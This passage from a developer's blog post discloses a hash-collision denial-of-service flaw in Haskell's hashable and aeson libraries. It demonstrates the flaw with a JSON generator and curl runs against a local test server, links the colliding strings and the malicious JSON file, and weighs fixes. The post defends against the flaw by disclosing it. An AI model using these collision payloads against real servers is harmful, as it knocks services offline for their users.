<span id="57"><a href="#57" aria-hidden="true" tabindex="-1"></a>buildJSON ts <span class="ot">=</span> <span class="st">&quot;{&quot;</span> <span class="op">&lt;&gt;</span> fold (intersperse (<span class="st">&quot;,&quot;</span>) (<span class="fu">map</span> toPair ts)) <span class="op">&lt;&gt;</span> <span class="st">&quot;}&quot;</span></span>
<span id="58"><a href="#58" aria-hidden="true" tabindex="-1"></a></span>
<span id="59"><a href="#59" aria-hidden="true" tabindex="-1"></a><span class="ot">toPair ::</span> <span class="dt">T.Text</span> <span class="ot">-&gt;</span> <span class="dt">Builder</span></span>
<span id="60"><a href="#60" aria-hidden="true" tabindex="-1"></a>toPair text <span class="ot">=</span> fromEncoding (toEncoding text) <span class="op">&lt;&gt;</span> <span class="st">&quot;:0&quot;</span></span></code></pre></div></div><p>This can be run using <a href="/assets/json-vulnerability/Construct.hs"><code>./Construct.hs n_24.txt</code></a>.</p><h4>Attacking ourselves</h4><p>To show the problem, first we start <a href="/assets/json-vulnerability/Server.hs">the server</a>:</p><pre>$ ./Server.hs
</pre><p>Next, we generate <a href="/assets/json-vulnerability/collide.json">the malicious JSON object</a>:</p><pre>$ ./Construct.hs n_24.txt
</pre><p>Then we can show the attack by uploading this JSON object using curl. First without the collisions and then with the collisions:</p><pre>$ time curl -X POST http://localhost:3000 -d @no-collide.json
Complete
curl -X POST http://localhost:3000 -d @no-collide.json  0.01s user 0.01s system 5% cpu 0.313 total
$ time curl -X POST http://localhost:3000 -d @collide.json
Complete
curl -X POST http://localhost:3000 -d @collide.json  0.02s user 0.01s system 0% cpu 2:18.98 total
</pre><p>with</p><pre>$ du -h no-collide.json
5.3M  no-collide.json
$ du -h collide.json
5.3M  collide.json
</pre><p>This shows that for equally sized inputs, the input with collisions triggers quadratic processing time. As a result, we can keep a web server busy for minutes using a malicious five megabyte blob.</p><p>This concludes the story of how we found a way to DoS most Haskell servers with a minimal amount of traffic and requests.</p><h2>Assets</h2><ul><li><p><a href="/assets/json-vulnerability/n_24.txt">List of colliding strings</a></p></li><li><p><a href="/assets/json-vulnerability/collide.json">Malicious JSON value</a></p></li><li><p><a href="/assets/json-vulnerability/Server.hs">An example vulnerable server</a></p></li><li><p><a href="/assets/json-vulnerability/Hash.hs">A program to turn colliding strings into a malicious JSON value</a></p></li><li><p><a href="/assets/json-vulnerability/Construct.hs">A program to construct a falsification for a &quot;vulnerable server&quot; hypothesis</a></p></li></ul><h2>Solutions</h2><p>There are a few ways to fix this issue.</p><h3>Collision-resistant hash</h3><p>The <code>hashable</code> package could use a collision-resistant hash, like perhaps SHA256 . Unfortunately this would most likely seriously impact the performance of the hashing operation, rendering the <code>hashable</code> package useless in favour of something like the <code>cryptonite</code> package.</p><h3>Random salt on startup</h3><p>A compounding factor of why it was so easy to produce an exploit is that the default hash salt that the <code>hashable</code> uses in its <code>hash</code> function is fixed. The library could use a different salt, generated at random every time a program starts. This is not a solution because the vulnerability is still there, even if you have to find the seed to produce an exploit. You may be able to find the salt by getting the server to hash an empty string, for example:</p><pre>&gt; hashWithSalt 42 Data.Text.empty
42
&gt; hashWithSalt 43 Data.Text.empty
43
</pre><p>There are also some other nasty side-effects of this solution, namely that the <code>HashMap.toList</code> would produce a potentially different ordering on every run of the program.</p><h3>Collisionless containers</h3><p>As party of our investigation, we have come up with <a href="https://stackoverflow.com/questions/53495133/is-this-approach-to-dealing-with-hash-collisions-new-unique">a new-ish approach</a> to dealing with collisions. Instead of using linear chaining on collisions, we could instead recursively have the hashmap contain another hashmap that uses a different salt. <a href="https://github.com/haskell-unordered-containers/unordered-containers/pull/217">This approach has been fully implemented</a> and was ready to merge. The solution would strictly improve performance, at the cost of a minimal amount of extra memory in the case of a lot of collisions, without breaking backwards compatibility. However, it was rejected (privately) by two maintainers at the time because it does not come with a proof that it does not have any other vulnerabilities.</p><h3><code>Map</code> instead of <code>HashMap</code></h3><p>The <code>aeson</code> library could have used <code>Map</code> in its definition of JSON values:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="kw">type</span> <span class="dt">Object</span> <span class="ot">=</span> <span class="dt">HashMap</span> <span class="dt">Text</span> <span class="dt">Value</span> <span class="co">-- &lt;-- here</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="kw">type</span> <span class="dt">Array</span> <span class="ot">=</span> <span class="dt">Vector</span> <span class="dt">Value</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="kw">data</span> <span class="dt">Value</span> <span class="ot">=</span> <span class="dt">Object</span> <span class="op">!</span><span class="dt">Object</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>           <span class="op">|</span> <span class="dt">Array</span> <span class="op">!</span><span class="dt">Array</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a>           <span class="op">|</span> <span class="dt">String</span> <span class="op">!</span><span class="dt">Text</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a>           <span class="op">|</span> <span class="dt">Number</span> <span class="op">!</span><span class="dt">Scientific</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a>           <span class="op">|</span> <span class="dt">Bool</span> <span class="op">!</span><span class="dt">Bool</span></span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a>           <span class="op">|</span> <span class="dt">Null</span></span></code></pre></div></div><p>This would cost performance, as well as memory usage. It would also break backward compatibility because <code>Value</code> and <code>Object</code> are part of <code>aeson</code>&#39;s external API.</p><h2>References</h2><p>This document concerns the following pinned repositories:</p><ul><li><p><a href="https://github.com/tibbe/hashable/tree/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0">hashable</a> at commit <a href="https://github.com/tibbe/hashable/tree/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0">3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0</a>.</p></li><li><p><a href="https://github.com/tibbe/unordered-containers/tree/efa43a2ab09dc6eb72893d12676a8e188cb4ca63">unordered-containers</a> at commit <a href="https://github.com/tibbe/unordered-containers/tree/efa43a2ab09dc6eb72893d12676a8e188cb4ca63">efa43a2ab09dc6eb72893d12676a8e188cb4ca63</a>.</p></li><li><p><a href="https://github.com/bos/aeson/tree/550b03d62021c93da58d40014280486d1c82726e">aeson</a> at commit <a href="https://github.com/bos/aeson/tree/550b03d62021c93da58d40014280486d1c82726e">550b03d62021c93da58d40014280486d1c82726e</a>.</p></li><li><p><a href="https://github.com/haskell/text/tree/9fac5db9b048b7d68fa2fb68513ba86c791b3630">text</a> at commit <a href="https://github.com/haskell/text/tree/9fac5db9b048b7d68fa2fb68513ba86c791b3630">9fac5db9b048b7d68fa2fb68513ba86c791b3630</a>.</p></li><li><p><a href="https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b">fnv-collider</a> at commit <a href="https://github.com/Storyyeller/fnv-collider/tree/10fd4d28abe7fb6c5428df8fe309dbfb0094530b">10fd4d28abe7fb6c5428df8fe309dbfb0094530b</a>.</p></li></ul><p>Links in this document are permanent links for posterity.</p><h2>Conclusion</h2><p>I would really like this problem to be fixed.</p><p>In the meantime, developers:</p><ul><li><p>Do not expect <code>hashable</code>&#39;s hash function to be collision resistant.</p></li><li><p>Use <code>Map</code> instead of <code>HashMap</code> and <code>Set</code> instead of <code>HashSet</code> for untrusted inputs.</p></li><li><p>Do not use floating point numbers in a <code>HashSet</code> or as keys in a <code>HashMap</code> because two NaN values can form a trivial collision.</p></li><li><p>Do not use <code>aeson</code> or <code>yaml</code> to parse untrusted inputs.</p></li><li><p>Do not use <code>aeson</code>-based JSON-parsing Haskell web servers in situations where a DoS attack could cause trouble (like perhaps a <a href="https://cardano.org/">&#39;proof of online stake&#39; cryptocurrency</a>).</p></li></ul></div>
</div>
<div class="box"><div class="columns is-centered"><div class="column has-text-centered"><a class="button is-link" href="https://cs-syd.eu/posts/2021-10-22-why-mocking-is-a-bad-idea">Previous</a>
<br>
Why mocking is a bad idea</div>
<div class="column has-text-centered is-half"><p class="title is-5 has-text-centered">Start your Haskell project from a template</p>
<a class="button is-primary is-focused" href="https://template.cs-syd.eu">Haskell templates</a>
</div>
<div class="column has-text-centered"><a class="button is-link" href="https://cs-syd.eu/posts/2021-09-10-undefined-trick">Next</a>
<br>
The undefined trick</div>
</div>
</div>
</div>
</div>
</div>
</section>

<footer class="footer"><div class="container"><div class="columns is-centered has-text-centered-mobile p-4"><div>&copy;
<span id="copyright"><script>document.getElementById('copyright').appendChild(document.createTextNode(new Date().getFullYear()))</script>
CS SYD. Tom Sydney Kerckhove | Technical Leader | Speaker | Coach.</span>
</div>
</div>
<div class="columns is-centered has-text-centered-mobile"><a href="https://twitter.com/kerckhove_ts"><img class="m-1" src="https://cs-syd.eu/assets-static/res/footer/twitter-icon.svg?etag=ZiDIriys" alt="Tom Sydney Kerckhove Twitter" style="height: 25px">
</a>
<a href="https://github.com/NorfairKing"><img class="m-1" src="https://cs-syd.eu/assets-static/res/footer/github-icon.svg?etag=7FvBsxSM" alt="Tom Sydney Kerckhove Github" style="height: 25px">
</a>
<a href="https://www.linkedin.com/in/tomsydneykerckhove/"><img class="m-1" src="https://cs-syd.eu/assets-static/res/footer/linkedin-icon.svg?etag=HgHwwN6i" alt="Tom Sydney Kerckhove LinkedIn" style="height: 25px">
</a>
<a href="https://www.youtube.com/channel/UCUt66vU5-JTsJwMj_2mL_xQ/videos?view=0"><img class="m-1" src="https://cs-syd.eu/assets-static/res/footer/youtube-icon.svg?etag=yAyiA8D3" alt="Tom Sydney Kerckhove YouTube" style="height: 25px">
</a>
<a href="https://www.tiktok.com/@cssyd.eu"><img class="m-1" src="https://cs-syd.eu/assets-static/res/footer/tiktok-icon.svg?etag=P5hO0v-R" alt="Tom Sydney Kerckhove Tiktok" style="height: 25px">
</a>
</div>
<div class="columns is-centered has-text-centered-mobile"><a href="https://cs-syd.eu/contact">contact</a></a>
</div>
</div>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>document.addEventListener('DOMContentLoaded', function () {

  // Get all "navbar-burger" elements
  var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);

  // Check if there are any navbar burgers
  if ($navbarBurgers.length > 0) {

    // Add a click event on each of them
    $navbarBurgers.forEach(function ($el) {
      $el.addEventListener('click', function () {

        // Get the target from the "data-target" attribute
        var target = $el.dataset.target;
        var $target = document.getElementById(target);

        // Toggle the class on both the "navbar-burger" and the "navbar-menu"
        $el.classList.toggle('is-active');
        $target.classList.toggle('is-active');

      });
    });
  }

});
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
    processEscapes: true
  }
});

</script></body>
</html>
